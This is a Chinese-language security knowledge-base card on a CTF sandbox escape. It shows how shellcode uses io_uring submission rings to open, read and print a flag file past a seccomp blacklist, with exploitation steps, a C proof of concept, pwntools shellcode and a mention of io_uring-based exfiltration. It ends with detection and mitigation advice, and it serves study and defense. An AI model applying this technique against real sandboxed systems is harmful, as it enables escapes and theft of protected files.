---
id: binary-pwn-sandbox-escape-seccomp-io-uring-sqe-openat-read-write
title: seccomp 封死 read/write/open/openat/execve 时用 io_uring：手工 mmap SQ/CQ 环提交 IORING_OP_OPENAT/READ/WRITE，绕过 syscall 号黑名单 ORW
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: seccomp-syscall-blacklist-bypass-via-io-uring-sqe
aliases:
- io_uring 绕 seccomp
- io_uring_setup io_uring_enter ORW
- seccomp 黑名单漏 io_uring
- shellcode 用 io_uring 读 flag
- ACTF master of orw
tags:
- pwn
- sandbox-escape
- seccomp
- io-uring
- shellcode
- orw
- bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:36:21+08:00'
  notes: 已对照原文核对（ACTF 2023 master of orw）：seccomp 规则逐条禁 read/write/open/pread64/writev/sendfile/execve/openat/execveat 等并 KILL、未列 425/426；io_uring_setup+io_uring_enter 两次系统调用、IORING_OFF_SQ_RING/CQ_RING/SQES 偏移 0/0x8000000/0x10000000、三次 mmap、sq_off.array/tail 与 cq_off.cqes 用法、SQE opcode 0x12/0x16/0x17（18/22/23）与 rbp=rdx+0xa00 的寄存器残值用法均与正文一致；本次核对未读取图片（本篇正文无 img 引用），仅依据正文；未验证点为汇编 shellcode 依赖具体栈布局与寄存器残值，属题目定制，未在本环境复跑；0x1ac/0x1b5 等规则语义未逐一确认；原文为 CTF 题未标受影响版本，未填 affected_versions
---

## 一句话结论

当 seccomp 只按 syscall 号把 `read/write/open/openat/execve/sendfile/sendto/sendmsg/pread64/...` 全部 KILL、只放行其余调用时，`io_uring_setup(425)` 与 `io_uring_enter(426)` 通常不在黑名单里；shellcode 里手工 `mmap` 出 SQ/CQ 环与 SQE 数组，把 `IORING_OP_OPENAT`/`IORING_OP_READ`/`IORING_OP_WRITE` 写进 SQE 再 `io_uring_enter` 提交，就能在不触发任何被禁 syscall 的前提下完成 open/read/write 把 flag 读出——内核工作线程执行 I/O 时不经过 `__x64_sys_read` 等入口，seccomp 的 syscall 号过滤看不到它们。

## 原理

- **seccomp 过滤的是「谁调用」，不是「做了什么」**：seccomp-BPF 挂在进程的 syscall 入口上，按 `arch`/`sys_number` 判定。`io_uring` 只有三个入口系统调用（`setup`/`enter`/`register`），真正的 `openat`/`read`/`write` 由内核 io_uring worker 在提交后执行，走的是 VFS 内部函数而不是 syscall 入口，因此不在被拦集合里。
- **执行路径**：`io_uring_setup(entries, &params)` 返回 ring fd 并回填 `sq_off`/`cq_off`（`array`/`tail`/`head`/`ring_entries`、`cqes` 等偏移）；用户态按 `IORING_OFF_SQ_RING`(0)、`IORING_OFF_CQ_RING`(0x8000000)、`IORING_OFF_SQES`(0x10000000) 三次 `mmap` 得到共享内存；把 SQE 填到 `sqes[idx]`，将 idx 写入 `sq_ring[sq_off.array]`，自增 `sq_ring[sq_off.tail]`，再 `io_uring_enter(fd, to_submit, min_complete, IORING_ENTER_GETEVENTS, NULL, 0)` 一次性提交并等待完成；结果从 `cq_ring[cq_off.cqes]` 的 `cqe->res` 读。
- **为什么 `mmap` 与 `io_uring_enter` 不受影响**：示例沙箱只列举了常见 I/O 与 `execve` 系号（`0x1ac`/`0x1b5` 等也一并禁掉），没有列 425/426；`mmap` 一般也需要保留（否则程序自身无法运行），若 `mmap` 被禁则可改用 `mmap` 已存在的 RWX 段或 `IORING_OP_OPENAT` 的固定缓冲（`io_uring_register` 注册缓冲区）。
- **SQE 字段语义**：`opcode` 选操作（`IORING_OP_OPENAT=18`、`READ=22`、`WRITE=23`），`fd` 为目录 fd（`AT_FDCWD=-100`）或文件 fd，`addr` 为路径/缓冲区指针，`len` 为长度，`open_flags` 为 open 标志。C 版 `io_uring_prep_openat` 就是先按 `io_uring_prep_rw` 填通用字段再写 `open_flags`。
- **shellcode 化难点**：需要自己算 `params` 里的环偏移（不能硬编码）、拿到返回的 ring fd 与 mmap 地址，还要在受限代码空间（本例 0x400 字节）里复用寄存器。该题靠寄存器残值（`rdx` 指向可写区）建立 rbp 基准，再按 `[rbp-0xNM]` 存中间值。

## 触发条件

- 目标进程受 seccomp 限制，黑名单覆盖常见文件/网络 syscall 与 `execve`，但**未**禁止 `io_uring_setup`/`io_uring_enter`。
- 内核版本支持 io_uring（>= 5.1；`IORING_OP_OPENAT` 自 5.6，`IORING_OP_*` 的 rw 类更早），且 `/proc/sys/kernel/io_uring_disabled` 未设为 2。
- 攻击者能写入并执行 shellcode（RWX 段，或可 mprotect 的段），且 `mmap` 可用。
- 容器场景需注意：Docker/containerd 默认 seccomp profile 会拦 `io_uring_setup`，此时该路不通。

## 利用步骤

1. 先用 `seccomp-tools dump` 读出完整规则，确认被禁 syscall 集合与其中**缺失**的号（重点看 425/426/427）。
2. 写 C 版最小验证程序：`syscall(425, 16, &params)` → 三次 `mmap` → 填 `IORING_OP_OPENAT` 打开 `/flag` → `io_uring_enter` 提交 → `cqe->res` 得 fd → 再提交 `IORING_OP_READ` → 再提交 `IORING_OP_WRITE` 到 fd 1。
3. 在本地用同一 seccomp 规则跑通（`prctl` + BPF 或 `libseccomp` 复现），确认 3 次提交里没有任何被禁 syscall。
4. 用 IDA 把 C 逻辑翻成汇编 shellcode：优先复用寄存器残值建立可写基准（`mov rbp, rdx; add rbp, 0xa00`），把 `params`、ring 地址、fd 等中间量存到栈/可写区。
5. 把 SQE 清零后逐字段写（`opcode`/`fd`/`addr`/`len`/`open_flags`），并按 `params` 回填的 `sq_off.array`/`tail` 偏移更新环形索引；`io_uring_enter` 的 `min_complete` 依次设 1/1/3 以匹配已提交数量。
6. 发送 shellcode，读回 flag；若 3 次提交受限，可合并为一次提交多个 SQE（`to_submit=3`）减少调用次数。

## PoC

```c
// 最小验证：seccomp 禁 open/openat/read/write/execve 时仍能 ORW
struct io_uring_params params = {0};
int ring = syscall(425 /*io_uring_setup*/, 16, &params);
unsigned char *sq = mmap(0, 0x1000, 3, MAP_SHARED, ring, 0);
unsigned char *cq = mmap(0, 0x1000, 3, MAP_SHARED, ring, 0x8000000);
struct io_uring_sqe *sqes = mmap(0, 0x1000, 3, MAP_SHARED, ring, 0x10000000);

sqes[0] = (struct io_uring_sqe){ .opcode = 18 /*OPENAT*/, .flags = IOSQE_ASYNC,
                                 .addr = (unsigned long)"/flag", .open_flags = O_RDONLY };
*(int *)(sq + params.sq_off.array) = 0;
(*(int *)(sq + params.sq_off.tail))++;
syscall(426 /*io_uring_enter*/, ring, 1, 1, 1 /*GETEVENTS*/, 0, 0);
int fd = ((struct io_uring_cqe *)(cq + params.cq_off.cqes))->res;
// 之后以同样方式提交 opcode=22 (READ, fd=fd, addr=buf, len=100)
// 与 opcode=23 (WRITE, fd=1, addr=buf, len=100, min_complete=3)
```

```python
# 汇编化骨架（要点：用寄存器残值建立可写基准，再按 SQE 布局逐字段写）
shellcode  = asm("mov rbp, rdx; add rbp, 0xa00; mov rbx, rbp; sub rbx, 0xf0")
shellcode += asm(shellcraft.syscall(425, 16, "rbx"))          # io_uring_setup
shellcode += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0))        # SQ ring
shellcode += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0x8000000)) # CQ ring
shellcode += asm(shellcraft.mmap(0, 1000, 3, 1, "r13", 0x10000000))# SQEs
# 填 SQE(opcode=0x12/OPENAT, addr="/flag") → 更新 array/tail → io_uring_enter(426,1,1,1)
# 再填 SQE(opcode=0x16/READ, fd=open 结果) → enter(426,1,1,1)
# 再填 SQE(opcode=0x17/WRITE, fd=1) → enter(426,1,3,1)
```

## 变体与关联

- **一次提交多个 SQE**：`to_submit=3` 把 open/read/write 一起提交，注意 read 依赖 open 的 fd，需在同一批次内用 `IOSQE_IO_LINK` 串联，或分两次提交。
- **更彻底隐蔽**：用 `IORING_OP_SOCKET`/`IORING_OP_CONNECT`/`IORING_OP_SEND`（5.19+）直接外带，连 `socket`/`sendto` 都不出现；这与同库 io_uring 监控对抗卡的方向一致，但目标从「躲审计」变成「绕 seccomp」。
- **规则补漏方向**：若 seccomp 只禁 `openat` 而放行 `openat2`，可不用 io_uring 直接 `openat2`；若禁了 `read` 未禁 `preadv2`/`sendfile`/`splice`，同目录已有对应卡。io_uring 是这些「漏号」之外的另一类结构性缺口。
- **失败情形**：`io_uring_disabled=2`、容器默认 seccomp profile、或 LSM 限制时该路不通，需回到 syscall 漏号思路。

## 检测与防御

- seccomp 侧：显式拦截 `io_uring_setup(425)`、`io_uring_enter(426)`、`io_uring_register(427)`；这是最直接有效的修复，容器默认 profile 已这么做。
- 内核/系统侧：`sysctl kernel.io_uring_disabled=2`（或 1 限制非特权用户），高安全场景编译期移除 io_uring。
- 检测：审计 `io_uring_setup/enter/register` 调用（`-a always,exit -F arch=b64 -S io_uring_setup -k uring`），对 Web/CTF 之外的进程使用 io_uring 建基线告警；eBPF hook `io_uring_submit_sqe`/`io_read`/`io_write` 观察实际 I/O。
- 审计题目/程序时，把「seccomp 是否覆盖 425-427」列为检查项；只按常见 syscall 列表写黑名单必然漏。
